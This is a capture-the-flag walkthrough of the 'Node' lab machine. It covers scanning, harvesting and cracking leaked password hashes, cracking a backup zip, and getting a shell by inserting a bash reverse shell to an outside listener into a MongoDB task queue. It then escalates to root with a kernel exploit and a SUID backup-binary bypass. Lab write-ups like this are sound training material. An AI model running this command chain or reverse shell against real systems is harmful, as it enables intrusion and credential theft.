# Node

**Machine ip:** 10.10.10.58

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.58 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.58`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/76b5cb96-bdc1-4d88-9b42-e1a2911dab3b)

+ The result shows that 2 ports are open:
```
Port 22: OpenSSH 7.2p2
Port 3000: Apache Hadoop
```

+ Navigate to `http://10.10.10.58:3000/` and always start off with enumerating web server first.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2f238baa-49a8-491c-820e-5d22c6b7d4fb)

+ View page source to see whether there is any useful information.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ae96894c-7dd7-4f67-97d9-32fb22b1b2e1)

+ **Firstly**, check `http://10.10.10.58:3000/assets/js/app/controllers/home.js`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dd4d850e-e804-4e59-9fa7-d63cc9d54e20)

+ Navigate to `http://10.10.10.58:3000/api/users/latest`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/029deb19-0572-4137-9767-6d06a2fb5ade)

+ Discovered usernames and password hashes:
```
[
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

+ **Secondly**, visit `http://10.10.10.58:3000/assets/js/app/controllers/profile.js` and view `http://10.10.10.58:3000/api/users/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/57a93960-4a6b-4dc7-ba1c-7cef751d95ec)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0145c645-9e8e-4429-a84a-424331ffa8d6)

+ Discovered usernames and password hashes:
```
[
  {
    "_id": "59a7365b98aa325cc03ee51c",
    "username": "myP14ceAdm1nAcc0uNT",
    "password": "dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af",
    "is_admin": true
  },
  {
    "_id": "59a7368398aa325cc03ee51d",
    "username": "tom",
    "password": "f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240",
    "is_admin": false
  },
  {
    "_id": "59a7368e98aa325cc03ee51e",
    "username": "mark",
    "password": "de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73",
    "is_admin": false
  },
  {
    "_id": "59aa9781cced6f1d1490fce9",
    "username": "rastating",
    "password": "5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0",
    "is_admin": false
  }
]
```

+ **Thirdly**, visit `http://10.10.10.58:3000/assets/js/app/controllers/admin.js` and view `http://10.10.10.58:3000/api/admin/backup`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c8e7da5f-7896-451a-a194-b91ba8a5259c)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2ba5edbb-68a2-4580-bab6-118347ae369a)

+ Discovered usernames and password hashes:
```
tom:f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
mark:de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
rastating:5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
myP14ceAdm1nAcc0uNT:dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
```

+ Crack hashes using [crackstation.net](https://crackstation.net):
```
f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240
de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73
5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0
dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/68b9f099-e845-4795-a618-6e8cefbc2cd2)

+ Cracked passwords and users:
```
tom:spongebob
mark:snowflake
myP14ceAdm1nAcc0uNT:manchester
```

+ Visit `http://10.10.10.58:3000/login` and login with the admin's account `myP14ceAdm1nAcc0uNT`:`manchester`
+ Download Backup file.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d89bea42-0470-4e1f-8e12-35246d747736)

+ File type: `file myplace.backup`
+ View only the last 100 bytes of data from **myplace.backup**: `tail -c 100 myplace.backup`
+ It is base64 encoding.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/06207dcb-8b7a-4d85-a3fe-c857022a6c4e)

+ Decode it: `base64 -d myplace.backup > decoded.file`
+ File type: `file decoded.file`
+ Extract zip file: `unzip decoded.file`
+ It requires a password.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/09a27b2a-3c5b-4c57-9f8d-eb142218df6a)

+ Crack it using **fcrackzip**: `fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file`
+ **Alternatively**, try **zip2john** with **john** to crack it.
```
┌──(kali㉿kali)-[~/Desktop]
└─$ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt decoded.file

PASSWORD FOUND!!!!: pw == magicword

```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ff73b8cb-fc1c-4f88-8ea4-cdf00c831664)

+ Unzip the file with the password: `unzip -P magicword decoded.file`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c709399b-ccce-47c1-ab28-cbd87c169155)

+ Discovered **mongodb** credentials in the **app.js** file:
```
const url         = 'mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace';
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3ad6fec3-13ff-4dbd-bd8d-29f5c298cbd3)


## Gainin Access

+ Login ssh with the discovered credentials `mark`:`5AYRft73VtFpc84k`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/58a4685a-5d78-402a-9748-0dc47e611ecd)

+ Mark doesn't have read permission to read user.txt.

## Privilege Escalation: from 'mark' to 'tom'

+ Escalate the privileges to Tom's privilege.
+ Check processes: `ps aux | grep -i tom`
```
mark@node:~$ ps aux | grep -i tom
tom       1233  0.0  5.9 1074104 45424 ?       Ssl  08:02   0:03 /usr/bin/node /var/scheduler/app.js
tom       1237  0.0  7.4 1029352 56552 ?       Ssl  08:02   0:04 /usr/bin/node /var/www/myplace/app.js
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8cff493d-1519-47ae-b447-d079edd5b2f6)

+ Focus on **/var/scheduler/app.js** process, and it's being run every 30 seconds by tom. This script will connect to the Mongo database, and then run a series of commands every 30 seconds.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f5c0ab3e-fb47-469d-84a4-ce2c6f5bebaf)

+ MongoDB is a popular open-source NoSQL (non-relational) document-oriented database management system like json, apart from RDBMS. It is designed to store, retrieve, and manage unstructured or semi-structured data. MongoDB uses a flexible, schema-less data model, which means that documents within a collection (similar to a table in a relational database) can have different fields and structures.
+ Login using mark’s credentials and access the scheduler database. The set interval function seems to be checking for documents (equivalent to rows) in the tasks collection (equivalent to tables). For each document it executes the cmd field. Since we do have access to the database, we can add a document that contains a reverse shell as the cmd value to escalate privileges.

+ Connect to mongodb: `mongo -u mark -p 5AYRft73VtFpc84k scheduler`
+ Lists the database name: `db`
+ Shows all the tables in the database - equivalent to **show tables**: `show collections`
+ List content in tasks table - equivalent to **select * from tasks**: `db.tasks.find()`
+ The tasks collection does not contain any documents. Insert a document that contains a reverse shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec0ae4be-6dcb-49dd-8693-492cc655661a)

+ Insert a reverse shell into the DB as the command:
```
db.tasks.insert({"cmd": "bash -c 'bash -i >& /dev/tcp/10.10.14.10/4444 0>&1'"})
```

+ Check that the document got added properly: `db.tasks.find()`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6925e4d6-ab7e-4f88-b721-c0bddd4d7c03)

+ Get the sheel 30 seconds later:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d0ba5da4-0ee6-4541-9d4e-12ec3eb812d9)

+ Stabilize shell:
```
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```

## Privilege Escalation: from 'tom' to 'root'

### Method 1
+ Check kernel version: `uname -a`
+ `searchsploit 4.4.0-`
+ `searchsploit -m 44298`
+ Review [CVE-2017-16995](https://www.exploit-db.com/exploits/44298)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1d6d1251-a747-4f64-a070-e64b9bd2a3da)

+ Transfer it to victim machine.
+ Compile: `gcc 44298.c -o exploit`
+ `./exploit`
+ Get root shell.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c475b937-09b3-430a-8c42-65c1c8a6e518)

### Method 2
+ Look for SUID: `find / -group admin -ls 2>/dev/null`
+ SUID bit is set for the file, it will execute with the level of privilege that matches the user who owns the file.
+ **/usr/local/bin/backup** file is owned by root, and Tom is in 1002(admin) group. If we run it with tom, it still going to be running as root!

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d944e615-c053-4c4a-a630-3384575eaacd)

+ Check `/var/www/myplace/app.js`, and the file takes in three arguments: The string '-q', a backup key which is passed at the beginning of the script, and a directory path.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/900399b4-a04c-4cc9-aa77-56f21bfa75df)

+ Run the file with the arguments.
+ The command will create a backup for any directory we want.
+ Back up /root, and copy on your kali vm:
```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
```

+ Base64 decode it: `cat file | base64 -d > backup.zip`
+ Decompress it with 7z using tha previos password `magicword`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4627d289-3498-4e5f-ae77-0ea827b14329)

+ Cat root.txt
+ It is junk.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/471f106f-6477-4998-af09-76a5497bac4c)

+ Trace what is happening in the background:
```
ltrace /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root
```

+ **/root** directory is going to be filtered, and the exact root directory we will not be got.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1fc25303-92f1-450f-92ff-f7e69cd31168)

+ **Alternatively 1**, change current directory as `/r**t/r**t.txt` using **wildcards**, and get root.txt
```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt > file
cat file | base64 -d > file.zip
unzip file.zip # password `magicword`
cd root/
cat root.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3c156512-5873-46da-aa78-175e1ce69ada)

+ **Alternatively 2**, set the **$HOME environment variable** to be **/root**: `export HOME=/root`
+ Call the backup program with the **~** character.
```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "~" > file
cat file | base64 -d > file.zip
unzip file.zip # password `magicword`
cd root/
cat root.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/58658eaa-f0bc-43f9-94c6-7da273786cfa)


# References & Alternatives
+ https://0xdf.gitlab.io/2021/06/08/htb-node.html
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/node-writeup-w-o-metasploit
+ https://benheater.com/hackthebox-node/
+ https://sanaullahamankorai.medium.com/hackthebox-node-walkthrough-f774ae2ece5c
+ https://manuelvazquez-contact.gitbook.io/oscp-prep/hack-the-box/node/scanning-and-enumeration
+ https://fmash16.github.io/content/writeups/hackthebox/htb-Node.html
